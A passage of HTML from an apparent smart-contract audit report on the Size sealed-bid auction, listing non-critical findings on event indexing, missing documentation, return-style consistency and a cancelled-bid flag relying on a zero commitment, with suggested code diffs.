version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>[N-02] Add indexes to events</h3>\n<p>Solidity indexes help dApps and users to filter and process the information provided by smart contracts. That is why adding indexes in values that may be interesting for the user improves the usability of the contract.</p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"diff\" data-index=\"34\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    event AuctionCreated(</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk8\">-       uint256 auctionId, address seller, AuctionParameters params, Timings timings, bytes encryptedPrivKey</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">+       uint256 indexed auctionId, address indexed seller, AuctionParameters params, Timings timings, bytes encryptedPrivKey</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    );</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    event AuctionCancelled(uint256 auctionId);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    event Bid(</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk8\">-       address sender,</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk8\">-       uint256 auctionId,</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">+       address indexed sender,</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">+       uint256 indexed auctionId,</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        uint256 bidIndex,</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        uint128 quoteAmount,</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        bytes32 commitment,</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        ECCMath.Point pubKey,</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        bytes32 encryptedMessage,</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        bytes encryptedPrivateKey</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    );</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk8\">-   event BidCancelled(uint256 auctionId, uint256 bidIndex);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">+   event BidCancelled(uint256 indexed auctionId, uint256 bidIndex);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk8\">-   event RevealedKey(uint256 auctionId, uint256 privateKey);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">+   event RevealedKey(uint256 indexed auctionId, uint256 privateKey);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk8\">-   event AuctionFinalized(uint256 auctionId, uint256[] bidIndices, uint256 filledBase, uint256 filledQuote);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">+   event AuctionFinalized(uint256 indexed auctionId, uint256[] bidIndices, uint256 filledBase, uint256 filledQuote);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk8\">-   event BidRefund(uint256 auctionId, uint256 bidIndex);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">+   event BidRefund(uint256 indexed auctionId, uint256 bidIndex);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk8\">-   event Withdrawal(uint256 auctionId, uint256 bidIndex, uint256 withdrawAmount, uint256 remainingAmount);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">+   event Withdrawal(uint256 indexed auctionId, uint256 bidIndex, uint256 withdrawAmount, uint256 remainingAmount);</span></span></span></code></pre>\n<p><strong>Reference:</strong></p>\n<ul>\n<li><a href=\"https://docs.soliditylang.org/en/latest/contracts.html#events\">https://docs.soliditylang.org/en/latest/contracts.html#events</a></li>\n</ul>\n<p><strong>Affected source code:</strong></p>\n<ul>\n<li><a href=\"https://github.com/code-423n4/2022-11-size/blob/706a77e585d0852eae6ba0dca73dc73eb37f8fb6/src/interfaces/ISizeSealed.sol#L97-L122\">ISizeSealed.sol:97-122</a></li>\n</ul>\n<h3 id=\"n-03-add-missing-param-information\" style=\"position:relative;\"><a href=\"#n-03-add-missing-param-information\" aria-label=\"n 03 add missing param information permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>[N-03] Add missing @param information</h3>\n<p>Some parameters have not been commented, which reflects that the logic has been updated but not the documentation, it is advisable that developers update both at the same time to avoid the code being out of sync with the project documentation.</p>\n<p><strong>Affected source code:</strong></p>\n<ul>\n<li>In <a href=\"https://github.com/code-423n4/2022-11-size/blob/706a77e585d0852eae6ba0dca73dc73eb37f8fb6/src/interfaces/ISizeSealed.sol#L82\">ISizeSealed.sol:82</a>:</li>\n</ul>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"diff\" data-index=\"35\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    /// @param baseToken The ERC20 to be sold by the seller</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    /// @param quoteToken The ERC20 to be bid by the bidders</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    /// @param reserveQuotePerBase Minimum price that bids will be filled at</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    /// @param totalBaseAmount Max amount of `baseToken` to be auctioned</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    /// @param minimumBidQuote Minimum quote amount a bid can buy</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">+   /// @param merkleRoot seller&#39;s merkleRoot for whitelist bidders</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    /// @param pubKey On-chain storage of seller&#39;s ephemeral public key</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    struct AuctionParameters {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        address baseToken;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        address quoteToken;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        uint256 reserveQuotePerBase;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        uint128 totalBaseAmount;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        uint128 minimumBidQuote;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        bytes32 merkleRoot;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        ECCMath.Point pubKey;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    }</span></span></span></code></pre>\n<ul>\n<li>In <a href=\"https://github.com/code-423n4/2022-11-size/blob/706a77e585d0852eae6ba0dca73dc73eb37f8fb6/src/SizeSealed.sol#L177\">SizeSealed.sol:177</a>:</li>\n</ul>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"diff\" data-index=\"36\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    /// @notice Reveals the private key of the seller</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    /// @dev All valid bids are decrypted after this</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    ///      finalizeData should be empty if seller does not wish to finalize in this tx</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">+   /// @param auctionId `auctionId` of the auction to bid on</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    /// @param privateKey Private key corresponding to the auctions public key</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    /// @param finalizeData Calldata that will be sent to finalize()</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    function reveal(uint256 auctionId, uint256 privateKey, bytes calldata finalizeData)</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        external</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        atState(idToAuction[auctionId], States.RevealPeriod)</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    {</span></span></span></code></pre>\n<ul>\n<li>In <a href=\"https://github.com/code-423n4/2022-11-size/blob/706a77e585d0852eae6ba0dca73dc73eb37f8fb6/src/util/ECCMath.sol#L51\">ECCMath.sol:51</a>:</li>\n</ul>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"diff\" data-index=\"37\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    /// @notice decrypts a message that was encrypted using `encryptMessage()`</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    /// @param sharedPoint G^k1^k2 where k1 and k2 are the</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">+   /// @param encryptedMessage encrypted message proporcionated by the other part</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    ///      private keys of the two parties that can decrypt</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    function decryptMessage(Point memory sharedPoint, bytes32 encryptedMessage)</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        internal</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        pure</span></span></span></code></pre>\n<h3 id=\"n-04-be-specific-with-comments\" style=\"position:relative;\"><a href=\"#n-04-be-specific-with-comments\" aria-label=\"n 04 be specific with comments permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>[N-04] Be specific with comments</h3>\n<p><code>cliffPercent</code> is based on 1e18, but this information was not shown in the code documentation.</p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"diff\" data-index=\"38\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    /// @dev Helper function to determine tokens at a specific `block.timestamp`</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    /// @return tokensAvailable Amount of unlocked `baseToken` at the current `block.timestamp`</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    /// @param vestingStart Start of linear vesting</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    /// @param vestingEnd Completion of linear vesting</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    /// @param currentTime Timestamp to evaluate at</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk8\">-   /// @param cliffPercent Normalized percent to unlock at vesting start</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">+   /// @param cliffPercent Normalized percent to unlock at vesting start based on 1e18 factor</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    /// @param baseAmount Total amount of vested `baseToken`</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    function tokensAvailableAtTime(</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        uint32 vestingStart,</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        uint32 vestingEnd,</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        uint32 currentTime,</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        uint128 cliffPercent,</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        uint128 baseAmount</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    ) internal pure returns (uint128) {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        if (currentTime &gt; vestingEnd) {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">            return baseAmount; // If vesting is over, bidder is owed all tokens</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        } else if (currentTime &lt;= vestingStart) {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">            return 0; // If cliff hasn&#39;t been triggered yet, bidder receives no tokens</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        } else {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">            // Vesting is active and cliff has triggered</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">            uint256 cliffAmount = FixedPointMathLib.mulDivDown(baseAmount, cliffPercent, 1e18);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">            return uint128(</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">                cliffAmount</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">                    + FixedPointMathLib.mulDivDown(</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">                        baseAmount - cliffAmount, currentTime - vestingStart, vestingEnd - vestingStart</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">                    )</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">            );</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        }</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    }</span></span></span></code></pre>\n<p><strong>Affected source code:</strong></p>\n<ul>\n<li><a href=\"https://github.com/code-423n4/2022-11-size/blob/706a77e585d0852eae6ba0dca73dc73eb37f8fb6/src/util/CommonTokenMath.sol#L45\">CommonTokenMath.sol:45</a></li>\n</ul>\n<h3 id=\"n-05-unify-return-criteria\" style=\"position:relative;\"><a href=\"#n-05-unify-return-criteria\" aria-label=\"n 05 unify return criteria permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>[N-05] Unify return criteria</h3>\n<p>In <code>ECCMath.sol</code> and <code>SizeSealed.sol</code> files, the methods are sometimes returned with return, other times the return variable is equal, and on other occasions the name of the return variable is not defined, unifying the way of writing the code makes the code more uniform and readable.</p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"diff\" data-index=\"39\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">+   function publicKey(uint256 privateKey) internal view returns (Point memory) {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">+       return ecMul(Point(GX, GY), privateKey);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    }</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">+   function ecMul(Point memory point, uint256 scalar) internal view returns (Point memory) {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        bytes memory data = abi.encode(point, scalar);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        if (scalar == 0 || (point.x == 0 &amp;&amp; point.y == 0)) return Point(1, 1);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        (bool res, bytes memory ret) = address(0x07).staticcall{gas: 6000}(data);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        if (!res) return Point(1, 1);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">+       return abi.decode(ret, (Point));</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    }</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">+   function encryptMessage(Point memory encryptToPub, uint256 encryptWithPriv, bytes32 message)</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        internal view</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        returns (Point memory buyerPub, bytes32 encryptedMessage)</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        Point memory sharedPoint = ecMul(encryptToPub, encryptWithPriv);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        bytes32 sharedKey = hashPoint(sharedPoint);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">+       encryptedMessage = message ^ sharedKey;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">+       buyerPub = publicKey(encryptWithPriv);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    }</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    function decryptMessage(Point memory sharedPoint, bytes32 encryptedMessage)</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        internal pure</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">+       returns (bytes32 decryptedMessage)</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">+       return encryptedMessage ^ hashPoint(sharedPoint);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    }</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">+   function hashPoint(Point memory point) internal pure returns (bytes32) {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">+       return keccak256(abi.encode(point));</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    }</span></span></span></code></pre>\n<p><strong>Affected source code:</strong></p>\n<ul>\n<li><a href=\"https://github.com/code-423n4/2022-11-size/blob/706a77e585d0852eae6ba0dca73dc73eb37f8fb6/src/util/ECCMath.sol#L18-L60\">ECCMath.sol:18-60</a></li>\n<li><a href=\"https://github.com/code-423n4/2022-11-size/blob/706a77e585d0852eae6ba0dca73dc73eb37f8fb6/src/SizeSealed.sol#L466-L480\">SizeSealed.sol:466-480</a></li>\n</ul>\n<h2 id=\"n-06-dont-worry-about-keccak256-collisions\" style=\"position:relative;\"><a href=\"#n-06-dont-worry-about-keccak256-collisions\" aria-label=\"n 06 dont worry about keccak256 collisions permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>[N-06] Don’t worry about keccak256 collisions</h2>\n<p>When <code>cancelBid</code> is called, the <code>commitment</code> is set to 0 in order to force to fail the <code>computeCommitment</code> comparison.</p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"js\" data-index=\"40\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk4\">function</span><span class=\"mtk1\"> </span><span class=\"mtk11\">cancelBid</span><span class=\"mtk1\">(</span><span class=\"mtk12\">uint256</span><span class=\"mtk1\"> </span><span class=\"mtk12\">auctionId</span><span class=\"mtk1\">, </span><span class=\"mtk12\">uint256</span><span class=\"mtk1\"> </span><span class=\"mtk12\">bidIndex</span><span class=\"mtk1\">)</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk11\">external</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        ...</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk3\">// Prevent any futher access to this EncryptedBid</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk12\">b</span><span class=\"mtk1\">.</span><span class=\"mtk12\">sender</span><span class=\"mtk1\"> = </span><span class=\"mtk11\">address</span><span class=\"mtk1\">(</span><span class=\"mtk7\">0</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk3\">// Prevent seller from finalizing a cancelled bid</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk12\">b</span><span class=\"mtk1\">.</span><span class=\"mtk12\">commitment</span><span class=\"mtk1\"> = </span><span class=\"mtk7\">0</span><span class=\"mtk1\">;</span></span></span></code></pre>\n<p>In case of the result of <code>computeCommitment</code> returns 0, because a collision or an error, a cancelled bid will be processed as valid.</p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"js\" data-index=\"41\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">            </span><span class=\"mtk12\">bytes32</span><span class=\"mtk1\"> </span><span class=\"mtk12\">decryptedMessage</span><span class=\"mtk1\"> = </span><span class=\"mtk12\">ECCMath</span><span class=\"mtk1\">.</span><span class=\"mtk11\">decryptMessage</span><span class=\"mtk1\">(</span><span class=\"mtk12\">sharedPoint</span><span class=\"mtk1\">, </span><span class=\"mtk12\">b</span><span class=\"mtk1\">.</span><span class=\"mtk12\">encryptedMessage</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">            </span><span class=\"mtk3\">// If the bidder didn&#39;t faithfully submit commitment or pubkey</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">            </span><span class=\"mtk3\">// Or the bid was cancelled</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">            </span><span class=\"mtk15\">if</span><span class=\"mtk1\"> (</span><span class=\"mtk11\">computeCommitment</span><span class=\"mtk1\">(</span><span class=\"mtk12\">decryptedMessage</span><span class=\"mtk1\">) != </span><span class=\"mtk12\">b</span><span class=\"mtk1\">.</span><span class=\"mtk12\">commitment</span><span class=\"mtk1\">) </span><span class=\"mtk15\">continue</span><span class=\"mtk1\">;</span></span></span></code></pre>\n<p>It’s more resilient to use a different value as flag, <code>b.pubKey</code> will be safer and cheaper.</p>\n<p><strong>Affected source code:</strong></p>\n<ul>\n<li><a href=\"https://github.com/code-423n4/2022-11-size/blob/706a77e585d0852eae6ba0dca73dc73eb37f8fb6/src/SizeSealed.sol#L258\">SizeSealed.sol:258</a></li>\n<li><a href=\"https://github.com/code-423n4/2022-11-size/blob/706a77e585d0852eae6ba0dca73dc73eb37f8fb6/src/SizeSealed.sol#L435\">SizeSealed.sol:435</a></li>\n</ul>\n<p><strong><a href=\"https://github.com/code-423n4/2022-11-size-findings/issues/57#issuecomment-1363003042\">0xean (judge) confirmed severity for all issues</a></strong></p>\n<hr>\n<h1 id=\"gas-optimizations\" style=\"position:relative;\"><a href=\"#gas-optimizations\" aria-label=\"gas optimizations permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 